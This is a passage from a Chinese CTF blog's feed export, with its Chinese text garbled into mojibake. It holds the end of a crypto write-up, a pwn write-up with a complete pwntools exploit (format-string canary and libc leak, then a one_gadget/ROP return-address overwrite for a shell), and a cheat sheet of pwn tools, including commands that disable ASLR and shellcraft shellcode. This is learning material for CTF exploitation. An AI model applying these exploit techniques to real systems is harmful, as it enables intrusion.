  res = gmpy2.iroot(c+i*n,<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">if</span>(res[<span class="number">1</span>] == <span class="literal">True</span>):</span><br><span class="line">        m=res[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">print</span>(binascii.unhexlify(<span class="built_in">hex</span>(m)[<span class="number">2</span>:].strip(<span class="string">&quot;L&quot;</span>)))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;i=&quot;</span>+<span class="built_in">str</span>(i))</span><br><span class="line">    i = i+<span class="number">1</span></span><br></pre></td></tr></table></figure>



<p>NSSCTF{Rea1_Si9n3n}</p>
<h3 id="FunnyEncrypt"><a href="#FunnyEncrypt" class="headerlink" title="FunnyEncrypt"></a>FunnyEncrypt</h3><p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308300039451.png" alt="image-20230830002659009"></p>
<p>æœ¬æ¥æƒ³çœ‹çœ‹èƒ½ä¸èƒ½è¯é¢‘åˆ†æçš„ï¼Œç»“æœå‘ç°å®Œå…¨å¯¹ä¸åˆ°</p>
<p>åªå¥½æ ¹æ®å·²çŸ¥çš„nssctfå’Œå‰é¢çš„ä¸€å †è¯é‡Œé¢å¯»æ‰¾ç¬¦åˆé¢„æ„Ÿçš„å­—ç¬¦ä¸å­—æ¯å¯¹åº”å…³ç³»  ï¼Œ æ…¢æ…¢å¯¹åº”ç€å¯ä»¥æ‰¾åˆ°çš„</p>
]]></content>
      <categories>
        <category>èµ›é¢˜å¤ç°</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>ROUND#14 wp</title>
    <url>/posts/fa745d1d/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="ROUND-14-love"><a href="#ROUND-14-love" class="headerlink" title="ROUND#14  love"></a>ROUND#14  love</h1><span id="more"></span>



<h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>ç¨‹åºå¼€å¯NXå’Œcanaryä¿æŠ¤</p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308101239901.png" alt="image-20230810123951784"></p>
<p>vulnå‡½æ•°ä¸­å­˜åœ¨æ ˆæº¢å‡º</p>
<p>å˜é‡v4 &#x3D; 555ï¼Œv5 &#x3D; 520</p>
<p>readå‡½æ•°è¯»å…¥0x40å­—èŠ‚ï¼Œåœ¨printfå¤„æœ‰æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</p>
<p>éœ€è¦æ³¨æ„bufä¸ºbssæ®µå˜é‡ï¼Œéæ ˆæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ä¸èƒ½ç›´æ¥ä¿®æ”¹æ ˆä¸Šçš„å€¼ï¼Œéœ€è¦é€šè¿‡äºŒçº§æŒ‡é’ˆï¼Œå³æ ˆé“¾é—´æ¥ä¿®æ”¹</p>
<p>æ€è·¯ï¼š</p>
<ol>
<li>åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ä»»æ„å†™ä¿®æ”¹è®©v4&#x3D;v5ï¼Œè¿›å…¥vulnå‡½æ•°</li>
<li>åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ³„éœ²canaryå’Œ__libc_start_mainå‡½æ•°çœŸå®åœ°å€ï¼Œè®¡ç®—å‡ºlibcåŸºå€</li>
<li>æ„é€ payè¦†ç›–è¿”å›åœ°å€ä¸ºogæˆ–system ropé“¾getshell</li>
</ol>
<h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><h3 id="ç¬¬ä¸€æ­¥"><a href="#ç¬¬ä¸€æ­¥" class="headerlink" title="ç¬¬ä¸€æ­¥"></a>ç¬¬ä¸€æ­¥</h3><p>å°†v4å†™ä¸º520ã€‚å¦‚å›¾åœ¨æ ˆåç§»ä¸º3çš„åœ°æ–¹æœ‰ä¸€ä¸ªæ ˆé“¾ï¼š0x7ffe9c35d798-&gt;0x7ffe9c35d788&lt;-0x22bï¼Œå¯ä»¥ç”¨æ¥ä¿®æ”¹0x22bä¸º0x208</p>
<p>è¿™é‡Œå¯æ„é€ payä¸º</p>
<blockquote>
<p>pay &#x3D; â€˜%â€™+str(8)+â€™câ€™+â€™%9$hhnâ€™</p>
<p>æˆ–è€…</p>
<p>pay &#x3D; â€˜%â€™+str(520)+â€™câ€™+â€™%9$hhnâ€™  ï¼ˆä¹Ÿå¯ä»¥ç›´æ¥nä¸ç”¨hhnï¼‰</p>
</blockquote>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308101251928.png" alt="image-20230810125122840"></p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308101249495.png" alt="image-20230810124947461"></p>
<h3 id="ç¬¬äºŒæ­¥"><a href="#ç¬¬äºŒæ­¥" class="headerlink" title="ç¬¬äºŒæ­¥"></a>ç¬¬äºŒæ­¥</h3><p>æ³„éœ²canary å’Œ __libc_start_mainåœ°å€</p>
<p>è¿™é‡Œéœ€è¦å…ˆpatchelfå†è°ƒè¯•ç¡®å®šåç§»</p>
<p>è¿™é¢˜ä¸ä»…è¦patchæ‰libcå’Œldï¼Œè¿˜è¦å†patchelf â€“replace-needed libpthread.so.0 .&#x2F;libpthread-2.31.so .&#x2F;binary</p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308101359262.png" alt="image-20230810135900218"></p>
<p>ç¡®å®šcanaryçš„åç§»ä¸º9+6 &#x3D; 15ï¼›__libc_start_main+243ä¾¿å®œä¸º11+6 &#x3D; 17</p>
<blockquote>
<p>pay +&#x3D; â€˜-%15$p-%17$p-â€˜</p>
</blockquote>
<h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p>è¦†ç›–è¿”å›åœ°å€ä¸ºone_gadgetï¼Œæˆ–è€…è°ƒç”¨systemå‡½æ•°</p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308101404124.png" alt="image-20230810140417092"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;node4.anna.nssctf.cn&#x27;,28157)</span></span><br><span class="line"></span><br><span class="line">sda = <span class="keyword">lambda</span> delim,data :p.sendafter(delim,data)</span><br><span class="line">sd = <span class="keyword">lambda</span> data :p.send(data)</span><br><span class="line">sea = <span class="keyword">lambda</span> delim,data :p.sendafter(delim,data)</span><br><span class="line">sl = <span class="keyword">lambda</span> data :p.sendline(data)</span><br><span class="line">sla = <span class="keyword">lambda</span> delim,data :p.sendlineafter(delim,data)</span><br><span class="line">ru = <span class="keyword">lambda</span> delims,drop=<span class="literal">True</span> :p.recvuntil(delims,drop)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data :u32(data.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data :u64(data.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">lg = <span class="keyword">lambda</span> name,addr :log.success(name+<span class="string">&#x27;=&#x27;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line">ra = <span class="keyword">lambda</span> :p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr64</span>() : <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr32</span>() : <span class="keyword">return</span> u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pay = <span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">520</span>)+<span class="string">&#x27;c&#x27;</span>+<span class="string">&#x27;%9$hhn&#x27;</span></span><br><span class="line">pay += <span class="string">&#x27;-%15$p-%17$p-&#x27;</span></span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line">sla(<span class="string">b&#x27;Toka\n&#x27;</span>,pay)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line"><span class="comment">#æ³„éœ²cannary</span></span><br><span class="line">canary = <span class="built_in">int</span>(ru(<span class="string">&#x27;-&#x27;</span>),<span class="number">16</span>)</span><br><span class="line"><span class="comment">#libc</span></span><br><span class="line">libc_base = <span class="built_in">int</span>(ru(<span class="string">&#x27;-&#x27;</span>),<span class="number">16</span>)-<span class="number">243</span>-libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x00000000004013f3</span> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#pay=b&#x27;A&#x27;*0x28+p64(canary)+b&#x27;A&#x27;*8+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(elf.sym[&#x27;vuln&#x27;])</span></span><br><span class="line"><span class="comment">#sla(&#x27;level\n&#x27;,pay)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#libcbase = get_addr64()-libc.sym[&#x27;puts&#x27;]</span></span><br><span class="line"><span class="comment">#lg(&#x27;libcbase&#x27;,libcbase)</span></span><br><span class="line">lg(<span class="string">&#x27;canary&#x27;</span>,canary)</span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line"></span><br><span class="line">system_addr = libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">bin_sh_addr=libc_base+libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__()</span><br><span class="line"></span><br><span class="line">lg(<span class="string">&#x27;system&#x27;</span>,system_addr)</span><br><span class="line">lg(<span class="string">&#x27;binsh&#x27;</span>,bin_sh_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;level\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ret =<span class="number">0x000000000040101a</span> </span><br><span class="line"></span><br><span class="line">og = [<span class="number">0xe3afe</span>,<span class="number">0xe3b01</span>,<span class="number">0xe3b04</span>]</span><br><span class="line">pay = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(canary)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(ret)+p64(og[<span class="number">1</span>]+libc_base)</span><br><span class="line"><span class="comment">#pay = b&#x27;a&#x27;*0x28+p64(canary)+b&#x27;a&#x27;*8+p64(ret)+p64(pop_rdi)+p64(bin_sh_addr)+p64(system_addr)</span></span><br><span class="line"></span><br><span class="line">sl(pay)</span><br><span class="line"></span><br><span class="line">ra()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>èµ›é¢˜å¤ç°</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>PWNä¸€äº›ç”¨åˆ°çš„æŒ‡ä»¤å’Œå·¥å…·</title>
    <url>/posts/6121198a/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget"></a>ROPgadget</h1><h2 id="ROPgadget-â€“binary-æ–‡ä»¶å-â€“only-â€œæŒ‡ä»¤-æŒ‡ä»¤â€-grep-å¯„å­˜å™¨æˆ–è€…å…¶ä»–å­˜åœ¨çš„å­—æ®µ"><a href="#ROPgadget-â€“binary-æ–‡ä»¶å-â€“only-â€œæŒ‡ä»¤-æŒ‡ä»¤â€-grep-å¯„å­˜å™¨æˆ–è€…å…¶ä»–å­˜åœ¨çš„å­—æ®µ" class="headerlink" title="ROPgadget â€“binary æ–‡ä»¶å â€“only â€œæŒ‡ä»¤|æŒ‡ä»¤â€ | grep å¯„å­˜å™¨æˆ–è€…å…¶ä»–å­˜åœ¨çš„å­—æ®µ"></a>ROPgadget â€“binary æ–‡ä»¶å â€“only â€œæŒ‡ä»¤|æŒ‡ä»¤â€ | grep å¯„å­˜å™¨æˆ–è€…å…¶ä»–å­˜åœ¨çš„å­—æ®µ</h2><p>æŸ¥æ‰¾æ±‡ç¼–æŒ‡ä»¤çš„åœ°å€</p>
<p>ä¾‹å­ï¼š</p>
<blockquote>
<p>ROPgadget â€“binary get_started_3dsctf_2016 â€“only â€œmov|retâ€ |grep eax</p>
<p>ROPgadget â€“binary get_started_3dsctf_2016 â€“only â€œmov|retâ€ |grep â€˜: mov eaxâ€™ </p>
</blockquote>
<span id="more"></span>



<ul>
<li><p>â€“only â€ | â€œ è¡¨ç¤ºåªè¿”å›å«æœ‰xxæŒ‡ä»¤æˆ–xxæŒ‡ä»¤çš„gadget</p>
</li>
<li><p>grep  è¡¨ç¤ºå«æœ‰ä»€ä¹ˆä»€ä¹ˆç‰¹å®šå­—æ®µï¼ˆé€šå¸¸æ˜¯å¯„å­˜å™¨ï¼‰çš„æŒ‡ä»¤</p>
<p>ä½†æ˜¯grepèƒ½å¯»æ‰¾çš„å¿…é¡»æ˜¯è¿ç»­çš„æŒ‡ä»¤ä¸­é—´ä¸èƒ½éš”å¼€ï¼Œè¿ç©ºæ ¼éƒ½å¿…é¡»ä¸€è‡´æ‰èƒ½è¢«æœç´¢åˆ°</p>
<p>æ¯”å¦‚ä½ æƒ³è¦æœç´¢<code>0x080701a8 : mov eax, ecx ; ret</code>ï¼Œä½ å¯ä»¥ç”¨å‘½ä»¤<code>ROPgadget --binary get_started_3dsctf_2016 --only &quot;mov|ret&quot; |grep &#39;eax, ecx&#39;</code>ï¼›å‘½ä»¤<code>ROPgadget --binary get_started_3dsctf_2016 --only &quot;mov|ret&quot; |grep &#39;eax,ecx&#39;</code>æ— æ³•æˆåŠŸå› ä¸ºé€—å·å’Œecxä¹‹é—´å°‘äº†ä¸€ä¸ªç©ºæ ¼</p>
</li>
<li><p>å–åœ°å€çš„æŒ‡ä»¤[edx]æ— æ³•è¢«è¯†åˆ«ï¼Œ[ ]åœ¨ROPgadgetä¸­è²Œä¼¼æ˜¯è¡¨ç¤ºå«æœ‰[ ]å†…å­—æ¯çš„æŒ‡ä»¤</p>
<p>æ¯”å¦‚ ROPgadget â€“binary get_started_3dsctf_2016 â€“only â€œmov|retâ€ |grep â€˜[edx]â€™å¾—åˆ°çš„æ˜¯è¿™æ ·</p>
<p><img data-src="https://pica.zhimg.com/80/v2-a03e74edb3f031ec31244d7ace622128_720w.png"></p>
</li>
</ul>
<h2 id="ROPgadget-â€“binary-æ–‡ä»¶å-â€“sting-â€˜-x2F-bin-x2F-shâ€™"><a href="#ROPgadget-â€“binary-æ–‡ä»¶å-â€“sting-â€˜-x2F-bin-x2F-shâ€™" class="headerlink" title="ROPgadget â€“binary æ–‡ä»¶å â€“sting â€˜&#x2F;bin&#x2F;shâ€™"></a>ROPgadget â€“binary æ–‡ä»¶å â€“sting â€˜&#x2F;bin&#x2F;shâ€™</h2><p>æŸ¥æ‰¾å­—ç¬¦ä¸²åœ°å€</p>
<p>ä¾‹å­ï¼š</p>
<blockquote>
<p> ROPgadget â€“binary æ–‡ä»¶å â€“sting â€˜&#x2F;bin&#x2F;shâ€™</p>
<p> ROPgadget â€“binary æ–‡ä»¶å â€“sting â€˜&#x2F;shâ€™</p>
<p> ROPgadget â€“binary æ–‡ä»¶å â€“sting â€˜shâ€™</p>
<p> ROPgadget â€“binary æ–‡ä»¶å â€“sting â€˜cat flagâ€™</p>
<p> ROPgadget â€“binary æ–‡ä»¶å â€“sting â€˜cat flag.txtâ€™</p>
</blockquote>
<p>![(</p>
<p><img data-src="https://pic1.zhimg.com/80/v2-85292d5975829cdb33d0680fe463d9b0_720w.webp"></p>
<h1 id="vmmap"><a href="#vmmap" class="headerlink" title="vmmap"></a>vmmap</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vmmap [-h] [pages_filter]</span><br></pre></td></tr></table></figure>

<p>é¦–å…ˆvmmapéœ€è¦åœ¨pwndbgï¼Œä¸”ç¨‹åºè¿è¡Œæ—¶ä½¿ç”¨</p>
<ul>
<li>è¾“å…¥vmmapï¼Œæ˜¾ç¤ºå‡ºç¨‹åºè¿è¡Œæ—¶æ‰€ç”¨åˆ°çš„æ‰€æœ‰åœ°å€æ®µ</li>
<li>è¾“å…¥vmmap  åœ°å€  ï¼Œæ˜¾ç¤ºè¯¥åœ°å€å¯¹åº”çš„åœ°å€æ®µ</li>
<li>vmmap  -hï¼Œæç¤ºå¸®åŠ©ï¼›-wåªæ˜¾ç¤ºå¯å†™çš„éƒ¨åˆ†ï¼›-xåªæ˜¾ç¤ºå¯æ‰§è¡Œçš„éƒ¨åˆ†</li>
</ul>
<p>ä¾‹å­ï¼š</p>
<p><img data-src="https://pic1.zhimg.com/80/v2-81b1d3537046d8b961f5b5f4e3ae9265_720w.png"></p>
<p><img data-src="https://picx.zhimg.com/80/v2-d34d469968326f73e2dc20875beb8092_720w.png"></p>
<p><img data-src="https://pic1.zhimg.com/80/v2-1e067d5c59a6e8aa80e6bc37f171f76e_720w.png?source=d16d100b"></p>
<p>ç¬¬ä¸€è¡Œï¼Œè¡¨æ˜äº†å“ªä¸ªé¢œè‰²å¯¹åº”å“ªä¸ªæ®µï¼Œ</p>
<p>startå’Œendå¯¹åº”è¯¥åœ°å€æ®µçš„èµ·å§‹å’Œç»“æŸä½ç½®</p>
<p>Perm æ˜¯è¯¥æ®µçš„æƒé™ï¼Œrwxä»£è¡¨å¯è¯»ã€å¯å†™ã€å¯æ‰§è¡Œ</p>
<p>Sizeè¡¨ç¤ºè¯¥æ®µå¤§å°</p>
<p>Offsetè¡¨ç¤ºè¿™æ®µä¸ç¨‹åºåŸºå€çš„åç§»</p>
<p>Fileè¡¨ç¤ºåŠ è½½çš„æ˜¯ä»€ä¹ˆ</p>
<h1 id="vim"><a href="#vim" class="headerlink" title="vim"></a>vim</h1><p>å‘½ä»¤æ¨¡å¼ä¸‹ï¼š</p>
<blockquote>
<p>$	è¡Œæœ«</p>
<p>^	è¡Œé¦–</p>
<p>L	å±å¹•åº•è¡Œ</p>
<p>H	å±å¹•é¡¶è¡Œ</p>
<p>yy	æ‹·è´è¯¥è¡Œ</p>
<p>dd	åˆ é™¤è¯¥è¡Œ</p>
<p>P	å‰ç²˜è´´</p>
<p>p	åç²˜è´´</p>
<p>D 	åˆ é™¤è‡³è¡Œå°¾</p>
<p>u	æ’¤é”€</p>
<p>gg	å…‰æ ‡ç§»è‡³è¡Œé¦–</p>
<p>dG	åˆ é™¤å…‰æ ‡è¡ŒåŠå…‰æ ‡è¡Œä»¥ä¸‹å…¨éƒ¨å†…å®¹</p>
</blockquote>
<p>åº•çº¿å‘½ä»¤æ¨¡å¼ä¸‹ï¼š</p>
<blockquote>
<p>:wq		ä¿å­˜å¹¶é€€å‡º</p>
<p>:%d	åˆ é™¤å…¨éƒ¨å†…å®¹</p>
<p>:%s		æ›¿æ¢       <a href="http://10.102.32.142:8000/d/55-shi-bei-xi-ri-ben-ren-zai-ci-fen-xiang-you-qu-you-yong-de-xin-shou-xue-xi-zi-yuan/13#:~:text=%E5%89%8D%E5%B7%B2%E7%BC%96%E8%BE%91-,vim%E7%9A%84%E6%89%B9%E9%87%8F%E6%9B%BF%E6%8D%A2,-%E5%9C%A8%20Vim%20%E4%B8%AD">å‚è€ƒ</a>ï¼ˆä¸‡é‡Œå“¥æˆ‘æ»´ç¥ï¼‰</p>
</blockquote>
<h1 id="pwndbg"><a href="#pwndbg" class="headerlink" title="pwndbg"></a>pwndbg</h1><p>åŸºæœ¬æŒ‡ä»¤</p>
<ul>
<li>r &#x3D; run è¿è¡Œç¨‹åºï¼Œå¦‚æœä½ å½“å‰å·²ç»åœ¨è¿è¡Œç¨‹åºäº†ï¼Œå†è¾“å…¥rä¼šé‡æ–°è¿è¡Œç¨‹åº</li>
<li>b &#x3D; break ä¸‹æ–­ç‚¹ï¼Œåœ¨è°ƒè¯•pwnä¸­ï¼Œä¸€èˆ¬æ˜¯ b <em>0xabcde ï¼Œabcdeæ˜¯åœ¨idaä¸­çœ‹åˆ°çš„åœ°å€,å¦‚b</em> 0x400908</li>
<li>c &#x3D; continue ç»§ç»­è¿è¡Œç¨‹åºç›´åˆ°åœåœ¨ä¸‹ä¸€ä¸ªæ–­ç‚¹</li>
<li>n &#x3D; next ä¸‹ä¸€è¡Œï¼Œä¸€èˆ¬è£…äº†pwndbgä¹‹åä¸‹ä¸€è¡ŒæŒ‡çš„æ˜¯ä¸‹ä¸€æ¡æ±‡ç¼–ï¼Œä½†æ˜¯å¦‚æœè°ƒè¯•çš„ç¨‹åºæ˜¯å¸¦è°ƒè¯•ä¿¡æ¯çš„ï¼Œä¸€èˆ¬ä¼šè·³å‡ è¡Œæ±‡ç¼–</li>
<li>ni &#x3D; nexti ä¸‹ä¸€æ¡æŒ‡ä»¤ï¼Œè¿™ä¸ªå°±æ˜¯çœŸæ­£çš„ä¸‹ä¸€æ¡æ±‡ç¼–æŒ‡ä»¤</li>
<li>s &#x3D; step å•æ­¥è¿›å…¥å‡½æ•°</li>
<li>d &#x3D; delete åˆ é™¤æ–­ç‚¹ï¼Œåé¢å¯å¸¦æ•°å­—ï¼Œè¯´æ˜åˆ é™¤ç¬¬å‡ ä¸ªæ–­ç‚¹ï¼Œå¦‚æœä¸å¸¦å‚æ•°ï¼Œè¯´æ˜åˆ é™¤å…¨éƒ¨æ–­ç‚¹</li>
<li>x æŸ¥çœ‹å†…å­˜</li>
</ul>
<p>c,n,niè¿™å‡ ä¸ªç¨‹åºéƒ½å¯ä»¥å¸¦ä¸€ä¸ªæ•°å­—ï¼Œç”¨æ¥ä»£è¡¨è¿ç»­è¿è¡Œè¿™ä¸ªæŒ‡ä»¤å¤šå°‘æ¬¡</p>
<blockquote>
<p> x&#x2F;num xg  åœ°å€  64ä½æŸ¥çœ‹æŸå¤„åœ°å€</p>
</blockquote>
<blockquote>
<p>x&#x2F;num xw  åœ°å€  32ä½æŸ¥çœ‹æŸå¤„åœ°å€</p>
</blockquote>
<blockquote>
<p>s&#x2F;num s  åœ°å€  æŸ¥çœ‹ä»åœ°å€å¼€å§‹çš„numä¸ªå­—ç¬¦ä¸²</p>
</blockquote>
<blockquote>
<p>b *$rebase(åœ°å€)           ç”¨äºå¼€å¯PIEè¯¥æŒ‡ä»¤ä¼šåœ¨åŸºå€+åœ°å€å¤„ä¸‹æ–­ç‚¹ </p>
</blockquote>
<p><a href="https://wizardforcel.gitbooks.io/100-gdb-tips/content/index.html">https://wizardforcel.gitbooks.io/100-gdb-tips/content/index.html</a><br>100ä¸ªgdbå°æŠ€å·§</p>
<p>gdbåˆ¶å®šç¨‹åºè¿è¡Œçš„å‚æ•°<br>gdb â€“args binary value</p>
<p>gdbè°ƒè¯•æ”¹å˜åœ°å€æˆ–åœ°å€æŒ‡å‘å€¼<br>set addr_old &#x3D; addr<br>set *addr_old &#x3D; addr</p>
<p>bt<br>æ˜¾ç¤ºå‡½æ•°æ‰€æœ‰è°ƒç”¨æ ˆçš„ä¿¡æ¯<br>bt n<br>æ˜¾ç¤ºæ ˆé¡¶çš„nä¸ªè°ƒç”¨ä¿¡æ¯<br>bt -n<br>æ˜¾ç¤ºæ ˆåº•çš„nä¸ªè°ƒç”¨ä¿¡æ¯</p>
<p>ä¸­é—´åŠ fullè¡¨ç¤º   æ˜¾ç¤ºæ ˆä¸­æ‰€æœ‰å¸§çš„å®Œå…¨ä¿¡æ¯å¦‚ï¼šå‡½æ•°å‚æ•°ï¼Œæœ¬åœ°å˜é‡</p>
<h1 id="ASLRå’Œpieç¼–è¯‘"><a href="#ASLRå’Œpieç¼–è¯‘" class="headerlink" title="ASLRå’Œpieç¼–è¯‘"></a>ASLRå’Œpieç¼–è¯‘</h1><p>æŸ¥çœ‹ç³»ç»Ÿå½“å‰ASLRæ‰“å¼€æƒ…å†µ</p>
<blockquote>
<p>sudo cat &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space</p>
</blockquote>
<p>ASLRçš„ä¸‰ä¸ªçº§åˆ« ï¼š</p>
<p>0ï¼Œ ä¸å¼€å¯ä»»ä½•éšæœºåŒ–ï¼›</p>
<p>1ï¼Œ å¼€å¯stackã€libraries [ã€executable baseï¼ˆspecial libraries -^-ï¼‰ if PIE is enabled while compiling] çš„éšæœºåŒ–ï¼›</p>
<p>2ï¼Œå¼€å¯heapéšæœºåŒ–ã€‚</p>
<p>PIEç¼–è¯‘å‡ºæ¥çš„executableå¦‚æœASLR&#x3D;0çš„è¯ï¼ŒåŸºå€ä¹Ÿæ˜¯ä¸ä¼šå˜çš„ï¼ˆæœ‰èƒ½åŠ›ä½†æ²¡ä½¿ç”¨ï¼‰ï¼Œå¦‚æœASLR&#x3D;1çš„è¯ï¼Œå³ä½¿æŒ‰ç…§ASLRå®šä¹‰è¿™ä¸ªçº§åˆ«ä¼¼ä¹ä¸ä¼šå¯¹heapåŸºå€éšæœºåŒ–ï¼Œä½†æ˜¯ç”±äºexecutableçš„åŸºå€å·²ç»éšæœºåŒ–äº†ï¼Œæ‰€ä»¥heapçš„åŸºå€è‡ªç„¶ä¹Ÿå°±è¢«éšæœºåŒ–äº†</p>
<blockquote>
<p>æŒ‡ä»¤å…³é—­ASLR</p>
<p>sysctl -w kernel.randomize_va_space&#x3D;0</p>
<p>echo 0 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space</p>
</blockquote>
<p>  <img data-src="https://picx.zhimg.com/80/v2-a997d1be275e1071f3a7d542c0874870_720w.png"></p>
<p>fPIEé€‰é¡¹ä»…èƒ½åœ¨ç¼–è¯‘å¯æ‰§è¡Œç æ—¶ç”¨ï¼Œä¸èƒ½ç”¨äºç¼–è¯‘åº“ã€‚æ‰€ä»¥ï¼Œå¦‚æœæƒ³è¦PIEçš„ç¨‹åºï¼Œéœ€è¦ä½ é™¤äº†åœ¨gccå¢åŠ -fPIEé€‰é¡¹å¤–ï¼Œè¿˜éœ€è¦åœ¨ldæ—¶å¢åŠ -pieé€‰é¡¹æ‰èƒ½äº§ç”Ÿè¿™ç§ä»£ç ã€‚å³gcc -fpie -pieæ¥ç¼–è¯‘ç¨‹åºã€‚å•ç‹¬ä½¿ç”¨å“ªä¸€ä¸ªéƒ½æ— æ³•è¾¾åˆ°æ•ˆæœã€‚ </p>
<blockquote>
<p>gcc  helloworld.c </p>
<p>file a.out a.out: </p>
<p>ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU&#x2F;Linux 2.6.9, not stripped </p>
<p>file a.out a.out: </p>
<p>ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU&#x2F;Linux 2.6.9, not stripped </p>
</blockquote>
<p>æœªå¼€å¯PIEçš„æ–‡ä»¶å±æ€§ä¸ºexecutableï¼Œå¼€å¯çš„ä¸ºshared object</p>
<p>æ³¨æ„PIEéšæœºç¨‹åºåŠ è½½åŸºåœ°å€ï¼Œè¦å’Œlibcçš„éšæœºlibcåº“åŸºåœ°å€åŒºåˆ†</p>
<h1 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h1><p>pwntoolsç”Ÿæˆçš„shellcodeé»˜è®¤64ä½</p>
<blockquote>
<p>shellcode &#x3D; asm(shellcraft.sh()) </p>
</blockquote>
<p>è¦ç”Ÿæˆ32ä½çš„shellcodeéœ€è¦æŒ‡å®š</p>
<blockquote>
<p>shellcode &#x3D; asm(shellcraft.sh(),arch&#x3D;â€™i386â€™,os&#x3D;â€™linuxâ€™)      </p>
</blockquote>
<p>æ‰‹åŠ¨åæ±‡ç¼–æ±‡ç¼–æŒ‡ä»¤</p>
<blockquote>
<p>xx &#x3D; asm(â€˜â€™â€™</p>
<p>â€˜â€™â€™)</p>
</blockquote>
